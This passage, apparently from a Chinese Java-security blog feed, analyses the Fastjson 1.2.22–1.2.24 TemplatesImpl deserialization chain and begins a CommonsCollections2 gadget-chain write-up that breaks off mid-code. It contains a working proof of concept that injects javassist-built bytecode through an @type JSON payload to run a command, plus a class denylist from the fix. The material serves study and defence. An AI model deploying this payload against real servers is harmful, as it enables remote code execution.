title="2.后端程序反序列化触发条件"></a>2.后端程序反序列化触发条件</h2><p>​    目标后端程序进行反序列化解析的时候必须有如下条件，才能触发。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">input</span>,Object.<span class="hljs-params">class</span>, Feature.SupportNonPublicField)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse(input,Feature.SupportNonPublicField)<br></code></pre></td></tr></table></figure><p><code>Object.class</code>是因为<code>parseObject</code>如果不传入<code>Object.class</code>则会返回<code>fastjson.JSONObject</code>，无法将传入的类进行转换。</p><p><code>Feature.SupportNonPublicField</code>参数是为了能够控制目标类的私有属性。例如：<code>_bytecodes</code>用来存恶意字节码的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/15.png"></p><h2 id="3-bytecodes的值为啥需要BASE64加密"><a href="#3-bytecodes的值为啥需要BASE64加密" class="headerlink" title="3._bytecodes的值为啥需要BASE64加密"></a>3._bytecodes的值为啥需要BASE64加密</h2><p>在<code>com/alibaba/fastjson/serializer/ObjectArrayCodec</code>的<code>deserialze</code>方法调用了<code>bytesValue</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/17.png"></p><p>跟进<code>bytesValue</code>方法，位置：<code>com/alibaba/fastjson/parser/JSONScanner.bytesValue()</code> 90行，进行了Base64的解密操作。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/18.png"></p><h2 id="4-tfactory为什么是"><a href="#4-tfactory为什么是" class="headerlink" title="4._tfactory为什么是{}"></a>4._tfactory为什么是{}</h2><p>​    我们之前关于<code>TemplatesImp#defineclass</code>加载字节码的文章有写过，<code>_tfactory</code>的值是不能为<code>null</code>的，在这里需要的是一个<code>TransformerFactoryImpl</code>实例。</p><p>​    但是可以发现如果传入的键值为空的话，如果为空会根据类属性定义的类型自动创建实例。</p><h2 id="5-FastJson如何触发TemplatesImpl"><a href="#5-FastJson如何触发TemplatesImpl" class="headerlink" title="5.FastJson如何触发TemplatesImpl"></a>5.FastJson如何触发TemplatesImpl</h2><p>前面说到FastJson在反序列化过程中会自动调用类中的getter函数和setter函数，然后在FastJson在寻找对应的反序列化器的时候会调用一个smartMatch函数来进行模糊匹配，在该函数中会将我们 json中的 <code>_outputProperties</code> 转换成 <code>outputProperties</code>，转换之后fastjson就会找到 getOutputProperties 方法，最后调用时触发了TemplatesImpl的利用链导致RCE。</p><h1 id="4-TemplatesImp在FastJson中的利用链分析"><a href="#4-TemplatesImp在FastJson中的利用链分析" class="headerlink" title="4.TemplatesImp在FastJson中的利用链分析"></a>4.TemplatesImp在FastJson中的利用链分析</h1><p>还是利用如下POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        clas.makeClassInitializer().insertBefore(cmd);<br>        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br><br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String GADGAT_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String evil = Poc.generateEvil();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>一步步分析整个反序列化的流程以及<code>TemplatesImp</code>利用链触发：</p><p>首先进入到如下<code>com.alibaba.fastjson.JSON</code>位置的<code>parseObject</code>创建默认的<code>Json</code>解析器，并且将我们传入的序列化的<code>Poc</code>作为输入传入。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/19.png"></p><p>跟进<code>DefaultJSONParser</code>的构造方法：在代码125行会判断我们的<code>input</code>的第一个字符是不是<code>&#123;</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/20.png"></p><p>回到<code>parseObject</code>，在代码218行会调用上面实例化对象<code>parse</code>的<code>parseObject</code>解析传入的类。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/21.png"></p><p>跟进<code>parse</code>对象的<code>parseObject</code>，在代码的579行，<code>getDeserializer</code>方法处理我们传入的<code>type</code>类型获取的反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/22.png"></p><p>跟进<code>ParserConfig.getDeserializer</code>方法，可以发现代码276行会根据我们传入的<code>type</code>在<code>this.derializers</code>寻找对应的反序列化器，这里由于我们的type是<code>Object.class</code>所以是能够找到对应的反序列化器的，所以进入第一个if，直接返回找到的反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/23.png"></p><p>得到对应的反序列化器后，回到<code>DefaultJSONParser.parseObject()</code>中，在代码582行可以发现程序将上面获得的反序列化器拿来反序列化我们的数据。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/24.png"></p><p>在本例中进入到<code>JavaObjectDeserializer</code>反序列化器中，代码42行</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/25.png"></p><p>进入<code>parse.parse</code>也就是<code>DefaultJSONParser.parse()</code>方法</p><p>进入到switch，根据之前的token值进入对应的case，来到下面这个case处，这里new了一个JSON对象，然后利用<code>DefaultJSONParser.parseObject()</code> 对这个对象进行解析，此时fieleName为null，因为还没解析json字段中的内容</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/26.png"></p><p>跟进<code>DefaultJSONParser.parseObject()</code></p><p>首先会对json进行一些规范的检测，然后就会判断<code>&#123;</code> 下一个字符是不是 <code>&quot;</code> ，由于json数据 <code>&#123;</code> 后面就是<code>&quot;</code> 所以我们继续往下看即可</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/27.png"></p><p>继续往下看会有一个if判断，如果我们的key等于<code>JSON.DEFAULT_TYPE_KEY</code> 同时 没有开启<code>Feature.DisableSpecialKeyDetect</code> 的话就会进入判断，利用loadClass，加载我们的类对象</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/28.png"></p><p>继续往下跟，发现在<code>DefaultJSONParser.parse</code>代码304行会再次寻找反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/29.png"></p><p>跟进<code>getDeserializer()</code>方法，由于此时我们的type是<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 所以自然是找不到的，所以进入第二个if判断。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/30.png"></p><p>​    继续跟进<code>getDeserializer</code>方法，在第319行处会经过一个黑名单处理，会获取我们的类名然后判断我们的类是否在黑名单中。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/31.png"></p><p>一系列的判断后，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个<code>JavaBeanDeserializer</code>，将<code>type</code>和类传入。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/32.png"></p><p>获得反序列化器后，将器返回。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/33.png"></p><p>回到<code>ParserConfig.parseObject</code>，获得反序列化器后，正式开始反序列化了。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/34.png"></p><p>跟进<code>JavaBeanDeserializer.deserialize()</code></p><p>在代码547行，开始对我们传入的参数进行解析。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/35.png"></p><p>跟进<code>parseField</code>方法：在代码697行，可以看到利用<code>smartMatch</code>对我们传入的属性进行了模糊匹配，跟进该函数。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/36.png"></p><p>跟进<code>smartMatch()</code>方法，寻找与key对应的反序列化器。找不到对应的反序列化器则返回null。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/37.png"></p><p>当解析我们传入的数据<code>_outputProperties</code>后</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/38.png"></p><p>跟进<code>parseField</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/39.png"></p><p>继续跟进<code>smartMatch</code>：在代码787行发现将<code>_</code>替换为空。继续往下走就会返回反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/40.png"></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/41.png"></p><p>跟进该反序列化器的<code>parseField()</code>方法：</p><p>位置：<code>DefaultFieldDeserializer.parseField</code></p><p>调用与属性对应的反序列化器，对属性进行反序列化，将反序列化后的值赋值给value。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/43.png"></p><p>跟进<code>setValue</code>，可以发现利用反射触发了<code>getOutputProperties</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/44.png"></p><p>触发<code>newTransformer</code>方法，看到这里，有了解过的<code>Templateslmp</code>利用链就知道后面会发生什么了。剩下后面的分析就是纯粹的<code>Templateslmp</code>利用链的分析了，可以看看我关于CC2链的分析即可。我就不继续分析了</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/45.png"></p><h1 id="5-修复"><a href="#5-修复" class="headerlink" title="5.修复"></a>5.修复</h1><p>官方的修复如下：<a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p><p>将DefaultJSONParser.parseObject中将加载类的<code>TypeUtils.loadClass</code>方法替换为了<code>this.config.checkAutoType()</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/46.png"></p><p><code>checkAutoType</code>方法是利用了白名单+黑名单的机制来进行防护。</p><p><code>denyList</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">bsh</span><br><span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mchange</span><br><span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.sun</span>.<br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span><br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.Socket</span><br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.rmi</span><br><span class="hljs-selector-tag">javax</span><span class="hljs-selector-class">.xml</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.Transformer</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.fileupload</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.myfaces</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.servlet</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.wicket</span><span class="hljs-selector-class">.util</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.runtime</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.hibernate</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.jboss</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.mozilla</span><span class="hljs-selector-class">.javascript</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.python</span><span class="hljs-selector-class">.core</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><br></code></pre></td></tr></table></figure><h1 id="6-参考连接"><a href="#6-参考连接" class="headerlink" title="6.参考连接"></a>6.参考连接</h1><p><a href="https://www.freebuf.com/vuls/178012.html">https://www.freebuf.com/vuls/178012.html</a></p><p><a href="http://wjlshare.com/archives/1512">http://wjlshare.com/archives/1512</a></p><p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections2分析</title>
    <link href="https://reader-l.github.io/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/</id>
    <published>2021-04-15T11:13:15.000Z</published>
    <updated>2021-07-04T08:23:00.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h1><p>​    该利用链需要先学习<code>javassist</code>以及<code>PriorityQueue</code>相关知识。</p><p>关于<code>javassist</code>我已经在<a href="https://reader-l.github.io/2020/10/05/java%E5%AE%89%E5%85%A8-javassist%E5%AD%A6%E4%B9%A0/">前面的文章</a>有写过相关语法了（虽然很垃圾）。</p><h2 id="1-PriorityQueue"><a href="#1-PriorityQueue" class="headerlink" title="1.PriorityQueue"></a>1.PriorityQueue</h2><p>相关构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue()           <br>使用默认的初始容量（<span class="hljs-number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。<br>PriorityQueue(<span class="hljs-keyword">int</span> initialCapacity)<br>使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。<br></code></pre></td></tr></table></figure><p>常见的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">add(E e)           将指定的元素插入此优先级队列<br>clear()            从此优先级队列中移除所有元素。<br>comparator()       返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 <span class="hljs-keyword">null</span><br>contains(Object o)          如果此队列包含指定的元素，则返回 <span class="hljs-keyword">true</span>。<br>iterator()           返回在此队列中的元素上进行迭代的迭代器。<br>offer(E e)           将指定的元素插入此优先级队列<br>peek()           获取但不移除此队列的头；如果此队列为空，则返回 <span class="hljs-keyword">null</span>。<br>poll()           获取并移除此队列的头，如果此队列为空，则返回 <span class="hljs-keyword">null</span>。<br>remove(Object o)           从此队列中移除指定元素的单个实例（如果存在）。<br>size()           返回此 collection 中的元素数。<br>toArray()          返回一个包含此队列所有元素的数组。<br></code></pre></td></tr></table></figure><h1 id="2-利用链限制条件"><a href="#2-利用链限制条件" class="headerlink" title="2.利用链限制条件"></a>2.利用链限制条件</h1><h4 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h4><p>CommonsCollections 4.0</p><h4 id="JDK限制"><a href="#JDK限制" class="headerlink" title="JDK限制"></a>JDK限制</h4><p>JDK版本：暂无限制</p><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p>​    我们先来看一下yso中的利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">PriorityQueue.readObject()</span><br><span class="hljs-comment">...</span><br><span class="hljs-comment">TransformingComparator.compare()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>我们可以看到如下为该利用链的核心：通过<code>TransformingComparator.compare()</code>方法调用<code>transform</code>方法从而触发<code>InvokerTransformer.transform()</code>来达到触发命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator.compare()<br>InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><p>我们跟进<code>TransformingComparator.compare()</code>看一下：发现在构造函数中会将我们传入的<code>transformer</code>（比如是<code>InvokerTransformer</code>）赋值给<code>this.transformer</code> 属性，同时发现在<code>compare</code>方法会调用我们传入的<code>transformer</code>的<code>transform</code>方法，假如<code>compare</code>方法的参数值是我们可以控制的话，那我们就可以执行任意命令了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/1.png"></p><p>​    所以接下来我们就要找到可以调用<code>TransformingComparator.compare()</code>，并且参数<code>obj1</code>和<code>obj2</code>参数可以控制的类。<code>yso</code>中，<code>cc2</code>中是用到了 <code>PriorityQueue</code>来进行触发的。</p><h2 id="1-通过PriorityQueue触发TransformingComparator-compare-分析。"><a href="#1-通过PriorityQueue触发TransformingComparator-compare-分析。" class="headerlink" title="1.通过PriorityQueue触发TransformingComparator.compare()分析。"></a>1.通过PriorityQueue触发TransformingComparator.compare()分析。</h2><p>​    我们先来看看<code>PriorityQueue.writeObject</code>序列化的方法：我们可以发现假如调用<code>PriorityQueue.writeObject</code>的话，程序序列化的数据是<code>queue</code>属性，我们可以可以利用反射机制来控制<code>queue</code>，所以这里<code>queue</code>可控</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/14.png"></p><p>​    那我们首先从<code>PriorityQueue.readObject</code>开始看起：反序列化的数据是我们可以控制的，因此<code>queue</code>对象数组的值是我们可以控制的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/2.png"></p><p>​        跟进<code>heapify()</code>方法看一下：可以发现调用了<code>siftDown</code>方法处理了我们反序列化的数据<code>queue</code>。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/3.png"></p><p>​    跟进<code>sfitDown</code>方法看看：</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/4.png"></p><p>​    继续跟进<code>siftDownUsingComparator</code>方法进行查看：我们可以发现调用了<code>compare()</code>方法，同时它的相关参数我们都是可以控制的。这就是作者选择<code>PriorityQueue</code>的原因。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/5.png"></p><h2 id="2-部分完善利用链并写一个demo"><a href="#2-部分完善利用链并写一个demo" class="headerlink" title="2.部分完善利用链并写一个demo"></a>2.部分完善利用链并写一个demo</h2><p>我将yso中的利用链进行补全：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>Gadget chain:<br>ObjectInputStream.readObject()<br>PriorityQueue.readObject()<br>PriorityQueue.heapify()<br>                    PriorityQueue.siftDown()<br>                        PriorityQueue.siftDownUsingComparator()<br>                            TransformingComparator<span class="hljs-built_in">.compare</span>()<br>                                InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>                                        Method.invoke()<br>                                            Runtime.exec()<br> */<br></code></pre></td></tr></table></figure><p>根据以前写的命令执行的利用demo修改一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, 